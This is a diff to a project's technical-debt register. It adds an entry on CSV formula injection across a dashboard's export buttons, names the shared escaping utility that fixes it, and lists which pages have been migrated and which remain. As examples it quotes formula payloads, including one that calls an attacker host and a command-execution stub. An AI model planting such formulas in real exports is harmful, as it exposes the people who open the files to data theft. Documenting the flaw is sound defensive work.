@@ -4,7 +4,49 @@
 > auditor instead of by us. Every accepted shortcut belongs here with an owner
 > and a reason — see [`../contributing/review-process.md`](../contributing/review-process.md).
 
-Last reviewed: 2026-08-18 (re-audit)
+Last reviewed: 2026-09 (enterprise-tables pass)
+
+---
+
+## TD-021 — Hand-rolled CSV exports are formula-injection-prone (CWE-1236)
+
+**Status:** Open (2 of ~24 fixed) · **Severity:** P2 (security) · **Found by:** enterprise-tables pass, 2026-09
+
+The dashboard has ~24 "Export CSV" buttons, each hand-rolling the serialisation
+inline. Two failure modes recur:
+
+1. **Formula injection.** A cell whose text begins with `= + - @` (or a
+   tab/CR) is executed as a formula by Excel and Google Sheets when the file is
+   opened — `=WEBSERVICE("http://attacker")`, `=HYPERLINK(...)`, `=cmd|...`. Many
+   exported fields are attacker-influenceable: a vendor name, an owner, an
+   evidence title or a resource tag synced from a connected integration. A GRC
+   platform handing an auditor a spreadsheet that runs an attacker's formula is
+   the exact failure it exists to prevent.
+2. **Quoting.** Several exporters quote only some columns (e.g. `JSON.stringify`
+   on name/owner but raw on category), so a comma or newline in an unquoted
+   field corrupts the row.
+
+**The fix exists:** `dashboard/src/lib/csv.ts` (`toCsv` / `downloadCsv`) escapes
+every formula trigger by prefixing `'` (neutralises the formula, preserves the
+displayed text) and quotes every field per RFC 4180, with a UTF-8 BOM. It is
+unit-tested against the injection vectors. **Migrated so far:**
+`ModelRegistryPage.tsx`, `vendors/VendorRegistry.tsx`.
+
+**Remaining (~22), each to route through `downloadCsv`:** `EvidenceVault.tsx`,
+`vendors/VendorSLA.tsx`, `vendors/VendorAssessments.tsx`, `VendorUpload.tsx`,
+`EsgReports.tsx`, `AibomRegistry.tsx`, `CarbonLedger.tsx`, `EnergyEfficiency.tsx`,
+`ModelEfficiency.tsx`, `ConsentManagement.tsx`, `DsrManagement.tsx`,
+`EthicsReporting.tsx`, `training/TrainingAwareness.tsx`,
+`continuity/BusinessContinuity.tsx`, `data-governance/DataGovernancePage.tsx`,
+`maturity/BenchmarkingMaturity.tsx`, `rbac/UsersPage.tsx`,
+`rbac/DepartmentsPage.tsx`, `security/ModelArena.tsx`,
+`trust-engine/{CostTokenDashboard,LiveTraceFeed,FallbackLog,ToolCallMonitor}.tsx`.
+
+**Owner:** frontend. **Why not fixed in one pass:** 22 heterogeneous call sites,
+each with its own column set; migrating them unreviewed in a single overnight
+change risks silent column/order regressions in audit exports. They are being
+migrated incrementally as each page is next touched; the shared util means each
+migration is a few lines and closes the hole for that page.
 
 ---
 
